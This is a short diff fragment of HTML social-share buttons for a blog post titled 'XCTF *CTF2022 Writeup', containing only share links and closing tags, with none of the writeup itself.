+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/05/starCTF2022/&is_video=false&description=XCTF *CTF2022 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XCTF *CTF2022 Writeup&body=Check out this article: http://example.com/2022/06/05/starCTF2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/05/starCTF2022/&title=XCTF *CTF2022 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/05/starCTF2022/&name=XCTF *CTF2022 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/05/starCTF2022/&t=XCTF *CTF2022 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
